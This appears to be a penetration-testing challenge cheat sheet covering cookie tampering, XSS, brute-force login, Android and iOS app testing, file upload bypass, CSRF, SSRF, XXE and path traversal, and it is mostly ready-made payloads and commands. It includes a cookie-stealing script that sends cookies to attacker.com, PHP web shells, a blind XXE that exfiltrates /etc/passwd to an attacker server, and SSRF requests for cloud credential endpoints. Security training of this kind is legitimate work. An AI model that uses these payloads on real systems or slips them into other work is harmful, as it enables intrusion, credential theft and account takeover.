# 🟡 MODERATE Challenges (Success Ratio: 50%)

> These require solid web application security fundamentals. Target 8/10.

---

## Challenge 9: Cookie Tampering

### What They Test
Can you manipulate cookies to escalate privileges or bypass authentication?

### Methodology
1. **Inspect** cookies in DevTools (F12 → Application → Cookies)
2. **Identify** base64, JWT, or plaintext cookies
3. **Modify** values to escalate access

### Steps
```
1. Login as a normal user
2. Open DevTools → Application → Cookies
3. Look for session cookies, role cookies, auth cookies
4. Common cookie manipulations:
   - role=user → role=admin
   - isAdmin=false → isAdmin=true
   - user_id=1001 → user_id=1 (admin is often ID 1)
   - Base64 cookies: decode → modify → re-encode
   - JWT tokens: decode → change role → re-sign (if weak secret)
```

### Tools
```bash
# Decode Base64 cookies
echo "dXNlcj1hZG1pbg==" | base64 -d
# Output: user=admin

# Modify and re-encode
echo -n "role=admin" | base64

# JWT manipulation
# https://jwt.io - decode and inspect
# jwt_tool: python3 jwt_tool.py <token> -T  (tamper mode)

# Burp Suite
# Proxy → Intercept → modify cookie header before forwarding
```

### Common Weak Cookie Patterns
| Cookie           | Vulnerability         | Attack                       |
| ---------------- | --------------------- | ---------------------------- |
| `role=user`      | Plaintext role        | Change to `role=admin`       |
| `isAdmin=0`      | Boolean flag          | Change to `isAdmin=1`        |
| `user=dXNlcg==`  | Base64 encoded        | Decode → modify → re-encode  |
| `session=1234`   | Sequential session ID | Increment/decrement          |
| `auth=MD5(user)` | Weak hash             | Compute hash for target user |

---

## Challenge 10: XSS (Cross-Site Scripting) Basics

### What They Test
Can you inject and execute JavaScript through user input fields?

### Types of XSS
| Type      | Description                                 | Persistence |
| --------- | ------------------------------------------- | ----------- |
| Reflected | Payload in URL, reflected in response       | No          |
| Stored    | Payload saved to DB, rendered for all users | Yes         |
| DOM-based | Payload manipulates client-side DOM         | No          |

### Basic Payloads
```html
<!-- Standard test -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- In attributes -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onclick='alert(1)

<!-- In URLs -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Cookie stealing payload -->
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

### Steps
```
1. Find input fields (search bars, comments, profile fields, URL params)
2. Submit basic payload: <script>alert(1)</script>
3. If filtered, try alternative payloads (event handlers, encoding)
4. Check if output is reflected in HTML, attribute, JavaScript context
5. Adapt payload to the context:
   - HTML context: <script>alert(1)</script>
   - Attribute context: " onmouseover="alert(1)
   - JavaScript context: '-alert(1)-'
   - URL context: javascript:alert(1)
```

---

## Challenge 12: Bruteforce Login Bypass

### What They Test
Can you brute force a login page to find valid credentials?

### Methodology
```bash
# Hydra - HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra - HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get /admin

# Hydra - SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  target.com ssh

# Burp Intruder
1. Capture login request
2. Send to Intruder (Ctrl+I)
3. Set attack type: Sniper (single field) or Cluster Bomb (multi-field)
4. Set payload positions on username/password
5. Load wordlist
6. Start attack
7. Sort by response length/status code → find valid creds

# ffuf (fast web fuzzer)
ffuf -u http://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401
```

### Common Wordlists
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/top-passwords.txt
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## Challenge 17: Mobile Application Testing - Android

### What They Test
Can you reverse engineer and test an Android application?

### Methodology
```bash
# 1. Decompile APK
apktool d application.apk -o output_dir
jadx -d output_dir application.apk    # Decompile to Java source

# 2. Search for hardcoded secrets
grep -r "password" output_dir/
grep -r "api_key" output_dir/
grep -r "secret" output_dir/
grep -r "http://" output_dir/       # Insecure HTTP connections
grep -r "firebase" output_dir/      # Firebase DB URLs

# 3. Check for insecure storage
# Look in: SharedPreferences, SQLite databases, files on SD card
# Path: /data/data/com.app.name/shared_prefs/
# Path: /data/data/com.app.name/databases/

# 4. Proxy traffic through Burp
# Install Burp CA certificate on device/emulator
# Set proxy: Settings → Wi-Fi → Modify → Proxy → Manual
# Burp: Proxy → Options → Listen on all interfaces

# 5. Bypass certificate pinning
# Using Frida:
frida -U -l ssl_bypass.js com.target.app

# Using Objection:
objection -g com.target.app explore
android sslpinning disable

# 6. Check AndroidManifest.xml for:
# - android:debuggable="true"
# - android:allowBackup="true"
# - Exported activities/services/receivers
# - Custom URL schemes
```

---

## Challenge 18: Mobile Application Testing - iOS

### What They Test
Can you test an iOS application for security vulnerabilities?

### Methodology
```bash
# 1. Decrypt and extract IPA
# On jailbroken device:
frida-ios-dump -l     # List apps
frida-ios-dump -n AppName  # Dump decrypted

# 2. Static analysis
# Extract IPA (rename .ipa to .zip, unzip)
# Inspect Payload/App.app/
# Check Info.plist for:
# - ATS (App Transport Security) exceptions
# - URL schemes
# - Permissions

# 3. Use class-dump for Objective-C headers
class-dump -H AppBinary -o headers/

# 4. Search for sensitive data
strings AppBinary | grep -i "password\|secret\|key\|token"

# 5. Check keychain storage
# Using Objection:
objection -g com.target.app explore
ios keychain dump

# 6. Runtime manipulation with Frida
frida -U -l hook.js com.target.app
# Common hooks: bypass jailbreak detection, SSL pinning, login

# 7. Proxy traffic
# Install Burp CA profile on iOS device
# Settings → Wi-Fi → Proxy → Manual → Burp IP:port
```

---

## Challenge 21: File Upload Bypass

### What They Test
Can you bypass file upload restrictions to upload malicious files?

### Bypass Techniques
```
1. Extension bypass:
   - shell.php → shell.php5, shell.phtml, shell.pHp
   - shell.php → shell.php.jpg (double extension)
   - shell.php → shell.php%00.jpg (null byte - older systems)
   - shell.php → shell.php;.jpg (semicolon)

2. Content-Type bypass:
   - Change Content-Type header to: image/jpeg, image/png, image/gif
   - In Burp: modify Content-Type on upload request

3. Magic bytes bypass:
   - Add image magic bytes at start of PHP file:
   - GIF: GIF89a<?php system($_GET['cmd']); ?>
   - PNG: \x89PNG followed by PHP code

4. .htaccess upload:
   - Upload .htaccess with: AddType application/x-httpd-php .jpg
   - Then upload shell.jpg (will execute as PHP)

5. SVG file upload (XSS):
   <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert(document.cookie)</script>
   </svg>
```

### Web Shell Payloads
```php
<!-- Simple PHP shell -->
<?php system($_GET['cmd']); ?>

<!-- One-liner -->
<?php echo shell_exec($_GET['cmd']); ?>

<!-- More stealthy -->
<?php if(isset($_REQUEST['cmd'])){echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";} ?>
```

### Steps
```
1. Try normal upload → observe what's blocked
2. Check which validation is used:
   - Client-side JS? → Disable JS or use Burp
   - Extension check? → Try alternative extensions
   - Content-Type check? → Modify header in Burp
   - Magic bytes check? → Prepend valid image header
   - File content check? → Embed payload in image metadata
3. Upload web shell
4. Access: http://target.com/uploads/shell.php?cmd=whoami
```

---

## Challenge 23: CSRF Attack (Cross-Site Request Forgery)

### What They Test
Can you craft a request that performs actions on behalf of an authenticated user?

### Methodology
1. Find a **state-changing action** (password change, email update, fund transfer)
2. Check if there are **CSRF protections** (tokens, SameSite cookies, Referer check)
3. Craft a **malicious HTML page** that submits the request

### CSRF PoC Templates
```html
<!-- Auto-submit form -->
<html>
<body>
  <form action="http://target.com/change-email" method="POST" id="csrfForm">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>

<!-- Image tag (GET-based CSRF) -->
<img src="http://target.com/transfer?to=attacker&amount=1000" width="0" height="0">

<!-- AJAX-based CSRF -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://target.com/api/change-password", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.withCredentials = true;
  xhr.send("new_password=hacked123");
</script>
```

### Bypassing CSRF Protections
```
1. Remove CSRF token entirely → server might not validate
2. Use another user's CSRF token → server might not bind to session
3. Change POST to GET → CSRF might only protect POST
4. Change Content-Type → application/x-www-form-urlencoded to avoid preflight
5. Exploit subdomain XSS → same-origin, no CSRF needed
```

---

## Challenge 24: SSRF (Server-Side Request Forgery)

### What They Test
Can you make the server send requests to internal/unintended destinations?

### Methodology
```bash
# Test basic SSRF
# Find a feature that fetches URLs (image loader, URL preview, webhooks)

# Internal service discovery
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0177.0.0.1      # Octal
http://2130706433       # Decimal
http://0x7f000001       # Hex

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Header required: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true

# Internal port scanning
http://127.0.0.1:22    # SSH
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:8080  # Internal web app

# Filter bypass
http://127.0.0.1 → http://127.1
http://localhost → http://localtest.me
http://target.com@127.0.0.1
http://127.0.0.1#@allowed.com
```

---

## Challenge 25: XXE (XML External Entity) Injection

### What They Test
Can you exploit XML parsers to read files or perform SSRF?

### Basic XXE Payloads
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Blind XXE (Out-of-Band)
```xml
<!-- Exfiltrate data via HTTP -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&send;</root>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### XXE in Different Contexts
```
1. SOAP requests → inject DTD in XML body
2. File uploads → SVG, DOCX, XLSX contain XML
3. Content-Type: application/xml → change from JSON to XML
4. RSS/Atom feeds → inject in feed XML
5. SAML responses → inject in SAML XML
```

### Steps
```
1. Find XML input (API, file upload, SOAP, config)
2. Test basic XXE with file:///etc/passwd
3. If no output (blind), use out-of-band technique
4. If external entities blocked, try parameter entities
5. If XML is filtered, try encoding or alternative DTD syntax
```

---

## Challenge 27: Directory Traversal

### What They Test
Can you read files outside the intended directory using path traversal?

### Payloads
```
# Basic traversal
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (older systems)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Unicode / UTF-8 encoding
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd

# Windows paths
..\..\..\windows\win.ini
..\..\..\windows\system32\config\SAM

# Absolute path (if filter strips ../)
/etc/passwd
C:\windows\win.ini
```

### Steps
```
1. Find file-related parameters (file=, path=, page=, doc=, template=)
2. Test: ?file=../../../etc/passwd
3. If filtered:
   - Try encoding: %2e%2e%2f
   - Try double encoding: %252e%252e%252f
   - Try absolute path: /etc/passwd
   - Try null byte: ../../../etc/passwd%00.jpg
   - Try nested: ....//....//etc/passwd
4. Check for LFI → RFI escalation
5. Try log poisoning for RCE via LFI
```

### Key Files to Target
| OS      | File                                    | Contains             |
| ------- | --------------------------------------- | -------------------- |
| Linux   | `/etc/passwd`                           | User accounts        |
| Linux   | `/etc/shadow`                           | Password hashes      |
| Linux   | `/etc/hosts`                            | Host mappings        |
| Linux   | `/proc/self/environ`                    | Environment vars     |
| Windows | `C:\windows\win.ini`                    | Windows config       |
| Windows | `C:\windows\system32\drivers\etc\hosts` | Host mappings        |
| Windows | `C:\windows\system32\config\SAM`        | User account DB      |
| Web     | `/var/www/html/.env`                    | App secrets          |
| Web     | `/var/log/apache2/access.log`           | Log poisoning target |
